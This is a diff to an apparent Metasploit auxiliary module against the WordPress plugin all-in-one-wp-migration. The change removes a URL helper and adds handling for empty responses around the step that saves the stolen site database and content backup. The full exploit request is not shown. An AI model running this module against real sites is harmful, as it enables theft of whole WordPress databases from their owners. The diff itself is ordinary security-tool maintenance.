@@ -37,10 +37,6 @@ class Metasploit3 < Msf::Auxiliary
       ], self.class)
   end
 
-  def exporter_url
-    normalize_uri(plugin_url, 'modules', 'export', 'templates', 'export.php')
-  end
-
   def check
     check_plugin_version_from_readme('all-in-one-wp-migration', '2.0.5')
   end
@@ -63,7 +59,13 @@ class Metasploit3 < Msf::Auxiliary
       fail_with(Failure::UnexpectedReply, "#{peer} - Server responded with status code #{res.code}")
     end
 
-    store_path = store_loot('wordpress.export', 'zip', datastore['RHOST'], res.body, 'wordpress_backup.zip', 'WordPress Database and Content Backup')
-    print_good("#{peer} - Backup archive saved to #{store_path}")
+    if res.body.blank?
+      print_status("Unable to download anything.")
+      print_status("Either the target isn't actually vulnerable, or")
+      print_status("it does not allow WRITE permission to the all-in-one-wp-migration/storage directory.")
+    else
+      store_path = store_loot('wordpress.export', 'zip', datastore['RHOST'], res.body, 'wordpress_backup.zip', 'WordPress Database and Content Backup')
+      print_good("#{peer} - Backup archive saved to #{store_path}")
+    end
   end
 end
